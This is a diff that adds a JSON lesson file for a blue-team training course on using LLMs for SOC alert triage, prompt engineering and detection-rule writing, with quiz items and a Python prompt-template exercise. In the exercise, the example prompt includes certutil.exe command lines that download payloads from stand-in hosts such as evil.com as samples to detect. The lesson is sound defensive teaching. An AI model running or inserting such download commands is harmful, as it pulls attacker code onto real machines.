@@ -1,0 +1,133 @@
+{
+  "lesson_id": "0883c3d3-38b8-4f4a-91a0-32b10398b310",
+  "domain": "blue_team",
+  "title": "AI-Powered SOC: LLMs for Investigation and Coding",
+  "difficulty": 2,
+  "order_index": 88,
+  "module": "SEC450 Section 1",
+  "prerequisites": ["Foundations of Security Operations"],
+  "concepts": [
+    "LLM integration in SOC workflows",
+    "AI-assisted alert triage",
+    "Prompt engineering for security analysis",
+    "Automated code generation for detection rules",
+    "LLM limitations and hallucination risks",
+    "AI-assisted log analysis and pattern recognition",
+    "ChatGPT/Copilot for SOC analysts",
+    "Responsible AI use in security operations"
+  ],
+  "estimated_time": 45,
+  "learning_objectives": [
+    "Apply LLMs to accelerate alert triage and investigation workflows",
+    "Write effective prompts for security analysis tasks (log interpretation, IOC enrichment, rule creation)",
+    "Use AI-assisted coding to generate detection rules, playbooks, and scripts",
+    "Identify LLM limitations, hallucination risks, and ethical considerations in SOC use",
+    "Integrate AI tools into existing SOC workflows without creating single points of failure"
+  ],
+  "post_assessment": [
+    {
+      "question": "What is the most critical risk when using LLMs for security analysis?",
+      "options": [
+        "LLMs are too slow for real-time analysis",
+        "Hallucination—generating confident but factually incorrect outputs",
+        "LLMs cannot process log data",
+        "LLMs always produce the same answer"
+      ],
+      "correct": 1,
+      "explanation": "Hallucination is the primary risk: LLMs can generate plausible-sounding but incorrect information. In security, acting on false intelligence can lead to missed threats or wasted investigation time."
+    },
+    {
+      "question": "Which prompt engineering technique produces the most reliable LLM output for security tasks?",
+      "options": [
+        "Asking vague, open-ended questions",
+        "Providing specific context, format requirements, and examples in the prompt",
+        "Using the shortest possible prompt",
+        "Asking the LLM to guess the answer"
+      ],
+      "correct": 1,
+      "explanation": "Specific, well-structured prompts with context, format requirements, and examples (few-shot prompting) produce far more reliable outputs than vague or minimal prompts."
+    },
+    {
+      "question": "How should an LLM be used in a SOC workflow?",
+      "options": [
+        "As a replacement for human analysts",
+        "As a copilot that accelerates human judgment—never as the final decision-maker",
+        "Only for writing reports, never for analysis",
+        "Only by senior analysts with AI training"
+      ],
+      "correct": 1,
+      "explanation": "LLMs are copilots, not autopilots. They accelerate triage, suggest hypotheses, and generate drafts, but human analysts must validate and make final decisions."
+    },
+    {
+      "question": "What data should NEVER be sent to public LLM APIs?",
+      "options": [
+        "Publicly available threat intelligence",
+        "PII, credentials, internal IPs, classified incident details",
+        "Generic security concepts",
+        "MITRE ATT&CK technique descriptions"
+      ],
+      "correct": 1,
+      "explanation": "Never send PII, credentials, internal infrastructure details, or classified incident data to public LLM APIs. This data could be stored, logged, or leaked. Use self-hosted models for sensitive data."
+    }
+  ],
+  "jim_kwik_principles": [
+    "Association: Link LLMs to a very fast intern who reads everything but sometimes makes things up—verify everything",
+    "Visualization: Picture the LLM as a co-pilot suggesting hypotheses while you fly the investigation",
+    "Storytelling: Imagine asking the LLM to explain a suspicious log entry and it instantly identifies the MITRE technique—that's the power",
+    "Chunking: Break AI SOC use into Triage → Analysis → Coding → Reporting",
+    "Repetition: Practice prompt engineering daily with real alerts to build intuition for what works",
+    "Senses: Visualize the LLM's output as a highlighted suggestion overlay on your investigation—always verify",
+    "Teaching: Show a colleague how to write a prompt that gets useful security analysis",
+    "Mnemonics: Use 'CRIB'—Context, Request, Instructions, Boundaries (for prompt engineering)",
+    "Emotion: Feel the relief of cutting alert triage time from 30 minutes to 3 with AI assistance",
+    "Movement: Walk through your investigation workflow and mark each step where AI could help vs. where human judgment is required"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "AI Won't Replace Analysts—But Analysts Who Use AI Will",
+      "content": "The SOC landscape is shifting. LLMs aren't replacing security analysts, but they're dramatically changing how we work. An analyst using AI assistance can triage alerts 3-5x faster, generate detection rules in minutes instead of hours, and spot patterns across logs that would take a human hours to correlate. The catch? LLMs hallucinate, they can't validate their own output, and they have no understanding—they pattern-match. This lesson teaches you to use AI as a force multiplier while maintaining the critical thinking that keeps you from getting burned by confident-sounding nonsense."
+    },
+    {
+      "type": "explanation",
+      "title": "LLM Capabilities and Limitations for SOC Work",
+      "content": "**What LLMs do well in SOC:**\n- Explain suspicious log entries and identify patterns\n- Generate Sigma/Splunk detection rules from natural language descriptions\n- Summarize long investigation threads\n- Translate IOCs between formats (IP, hash, domain)\n- Suggest MITRE ATT&CK mappings for observed behavior\n- Draft incident reports and communication\n- Write Python scripts for log parsing and enrichment\n\n**What LLMs do poorly:**\n- Factual verification (they hallucinate confidently)\n- Real-time data (training data has a cutoff date)\n- Nuanced judgment (is this alert truly malicious or just unusual?)\n- Confidential data handling (public APIs store and may leak data)\n- Consistent formatting without explicit instructions\n- Mathematical/cryptographic reasoning\n\n**The golden rule:** Treat LLM output like a very knowledgeable but sometimes unreliable colleague. Always verify before acting. Never trust. Always confirm.\n\n**Safe usage framework:**\n1. **Never** send PII, credentials, or classified data to public APIs\n2. **Always** verify factual claims (IOCs, CVEs, technique IDs)\n3. **Always** review generated code before execution\n4. **Always** validate detection rules against test data\n5. **Consider** self-hosted models (Llama, Mistral) for sensitive workflows"
+    },
+    {
+      "type": "explanation",
+      "title": "Teach Me Like I'm 10: AI in the SOC",
+      "content": "Imagine you have a super-fast helper who's read every security book ever written. You can ask them questions and they answer instantly.\n\nBut there's a catch: sometimes this helper makes things up and sounds really confident about it. Like, they might say 'this IP address is definitely malicious!' when it's actually a Google server.\n\nSo here's how to use your helper wisely:\n\n🔍 **Good:** 'Hey, what does this weird error message mean?' → They'll probably get it right.\n\n🔍 **Good:** 'Can you write a rule to detect when someone logs in from a new country?' → They'll write a pretty good first draft.\n\n❌ **Bad:** 'Is this alert real or fake?' → They might guess wrong. You need to check.\n\n❌ **Bad:** 'Here's all our secret data, what do you think?' → Never share secrets with a public helper!\n\nThink of AI as a very fast research assistant who's great at drafting but terrible at fact-checking. You're still the boss."
+    },
+    {
+      "type": "code_exercise",
+      "title": "AI-Assisted Detection Rule Generation",
+      "content": "```python\n#!/usr/bin/env python3\n\"\"\"Prompt Engineering for SOC Detection Rules\n\nThis script demonstrates effective prompt templates\nfor generating detection rules with LLM assistance.\n\"\"\"\n\n# ============================================\n# BAD PROMPT (vague, no context)\n# ============================================\nBAD_PROMPT = \"\"\"Write a detection rule for malware.\"\"\"\n\n# This produces generic, unusable output because:\n# - No platform specified (Windows? Linux? Network?)\n# - No format specified (Sigma? Splunk? YARA?)\n# - No specific behavior described\n# - No examples provided\n\n# ============================================\n# GOOD PROMPT (CRIB method: Context, Request, Instructions, Boundaries)\n# ============================================\nGOOD_PROMPT = \"\"\"\nCONTEXT:\nI'm a SOC analyst monitoring Windows endpoints with Splunk.\nWe've seen a pattern where attackers use certutil.exe to download\nmalicious files—a legitimate tool abused for lolbas (Living Off\nThe Land Binaries).\n\nREQUEST:\nWrite a Splunk SPL detection rule that identifies suspicious\ncertutil.exe usage. Include comments explaining each condition.\n\nINSTRUCTIONS:\n- Format: Splunk SPL query\n- Include: process name, command line arguments, parent process\n- Exclude: known legitimate certutil usage patterns\n- Add MITRE ATT&CK mapping as a comment\n- Provide severity and confidence level\n\nBOUNDARIES:\n- This is for detection only, not prevention\n- Focus on high-fidelity signals to reduce false positives\n- Do not include overly broad patterns\n\nEXAMPLE OF SUSPICIOUS USAGE:\ncertutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\\\temp\\\\p.exe\ncertutil.exe -verify -f http://malware.site/stage2.ps1\n\nEXAMPLE OF LEGITIMATE USAGE:\ncertutil.exe -dump -f C:\\\\certs\\\\mycert.pfx\n\"\"\"\n\n# Expected LLM output structure:\nEXPECTED_OUTPUT = \"\"\"\n# Splunk SPL Detection Rule: Suspicious Certutil Usage\n# MITRE ATT&CK: T1105 (Ingress Tool Transfer) + T1218 (Signed Binary Proxy)\n# Severity: High | Confidence: 80%\n\nindex=windows sourcetype=* (process_name=certutil.exe)\n(\n  (CommandLine=\"*urlcache*\" AND CommandLine=\"*http*\") OR\n  (CommandLine=\"*verify*\" AND CommandLine=\"*http*\") OR\n  (CommandLine=\"*split*\" AND CommandLine=\"*f *http*\")\n)\nNOT (\n  (CommandLine=\"*dump*\" AND CommandLine=\"*.pfx\") OR\n  (CommandLine=\"*store*\" AND CommandLine=\"*.cer\")\n)\n| eval severity=\"high\", confidence=\"80\"\n| table _time, host, user, CommandLine, ParentProcess\n\"\"\"\n\nprint(\"Use CRIB method for all LLM prompts:\")\nprint(\"C - Context: What environment? What tools?\")\nprint(\"R - Request: What specifically do you want?\")\nprint(\"I - Instructions: Format, include/exclude, constraints\")\nprint(\"B - Boundaries: What's out of scope? What must be excluded?\")\n```"
+    },
+    {
+      "type": "real_world",
+      "title": "Real-World SOC: AI-Assisted Investigation Workflow",
+      "content": "A SOC team integrated LLMs into their investigation workflow with measurable results:\n\n**Before AI assistance:**\n- Average alert triage time: 22 minutes\n- Detection rule creation: 2-4 hours\n- Report writing: 1-2 hours\n- IOC enrichment: 15-20 minutes per indicator\n\n**After AI assistance (6-month measurement):**\n- Average alert triage time: 6 minutes (3.6x faster)\n- Detection rule creation: 30-60 minutes (3-4x faster)\n- Report writing: 20-30 minutes (3x faster)\n- IOC enrichment: 3-5 minutes per indicator (4x faster)\n\n**Key workflow integration points:**\n1. **Alert triage:** LLM summarizes alert context, correlates with threat intel, suggests MITRE mapping\n2. **Investigation:** LLM analyzes suspicious logs, identifies anomaly patterns\n3. **Detection engineering:** LLM drafts Sigma/Splunk rules from analyst descriptions\n4. **Reporting:** LLM generates first draft, analyst reviews and refines\n\n**What didn't change:**\n- Final decision authority (always human)\n- Alert prioritization judgment (LLM suggests, analyst decides)\n- Validation of findings (LLM can hallucinate)\n- Communication to stakeholders (LLM drafts, human reviews)\n\n**Key learning:** AI accelerated everything by 3-4x, but the human verification step was never skipped. False positive rate actually decreased because analysts had more time for thorough investigation."
+    },
+    {
+      "type": "memory_aid",
+      "title": "Prompt Engineering for SOC: CRIB",
+      "content": "**C** — Context: Environment, tools, data sources, existing rules\n**R** — Request: Specific task with format and detail requirements\n**I** — Instructions: Output format, include/exclude criteria, examples\n**B** — Boundaries: Out-of-scope, exclusions, confidence levels\n\n**LLM SOC Use Cases Cheat Sheet:**\n| Task | Good Use? | Risk Level |\n|------|-----------|------------|\n| Alert summarization | ✅ Yes | Low |\n| Log pattern explanation | ✅ Yes | Low |\n| Detection rule drafting | ✅ Yes | Medium |\n| Script generation | ✅ Yes | Medium |\n| Report drafting | ✅ Yes | Medium |\n| IOC classification | ⚠️ Verify | High |\n| Threat attribution | ❌ Risky | High |\n| Incident decision-making | ❌ No | Critical |\n| Sensitive data analysis | ❌ Never | Critical |\n\n**Always remember:** AI suggests, human decides."
+    },
+    {
+      "type": "explanation",
+      "title": "AI-Assisted Coding for Detection Engineering",
+      "content": "Detection engineering is one of the highest-value AI use cases in the SOC:\n\n**Workflow for AI-assisted detection rule creation:**\n1. **Describe the threat behavior** in natural language to the LLM\n2. **Specify the platform** (Splunk, Elastic, Microsoft Sentinel) and rule format (Sigma, KQL, SPL)\n3. **Provide examples** of both malicious and legitimate activity\n4. **Review the output** against your environment and threat intel\n5. **Test** against historical data to validate detection and measure false positive rate\n6. **Iterate** with refined prompts based on test results\n\n**Sigma rule example generation:**\nPrompt: 'Write a Sigma rule detecting PowerShell downloading and executing code from the internet. Include common lolbas patterns. Exclude legitimate admin tools.'\n\n**Code generation for SOC scripts:**\n- Log parsing scripts (Python, PowerShell)\n- IOC enrichment automation (API calls to VT, Shodan, etc.)\n- Report formatting templates\n- Data transformation between formats\n\n**Critical review checklist for AI-generated code:**\n- Does it handle errors gracefully?\n- Are API keys managed securely (not hardcoded)?\n- Does it validate input data?\n- Does it respect rate limits?\n- Is the logic actually correct? (Test, don't trust)\n- Does it log actions for audit trails?"
+    },
+    {
+      "type": "reflection",
+      "title": "AI Integration Plan for Your SOC",
+      "content": "Design your AI integration strategy:\n\n1. **Data sensitivity:** Which data can go to public LLMs? Which requires self-hosted models? Document your data classification.\n\n2. **Workflow mapping:** List your top 5 time-consuming tasks. Which could benefit from AI acceleration?\n\n3. **Prompt library:** Start building a library of tested, effective prompts for recurring tasks (alert triage, rule creation, report writing).\n\n4. **Verification process:** How will you validate AI output? Who reviews? What's the escalation path for uncertain findings?\n\n5. **Training:** What AI literacy training does your team need? (Prompt engineering, hallucination awareness, data handling)\n\n6. **Metrics:** How will you measure AI impact? (Time to triage, detection quality, false positive rate, analyst satisfaction)\n\n**Start small:** Pick one workflow (alert summarization is usually easiest), integrate AI, measure the improvement, then expand."
+    },
+    {
+      "type": "mindset_coach",
+      "title": "Your New Co-Pilot",
+      "content": "AI in the SOC is like having a brilliant but occasionally unreliable co-pilot. They'll spot patterns you might miss, draft rules in seconds, and summarize hours of logs into paragraphs. But they'll also confidently tell you that a perfectly normal IP is malicious, or generate a detection rule that matches nothing. Your job hasn't changed—you still make the final call. What's changed is how fast you get to that call. Embrace the speed, verify the accuracy, and never let the AI be the last word on a security decision."
+    }
+  ],
+  "tags": ["Course: SANS-SEC450", "Career Path: SOC Analyst", "Career Path: AI Security", "LLM", "AI-SOC", "prompt-engineering", "detection-engineering", "automation"]
+}
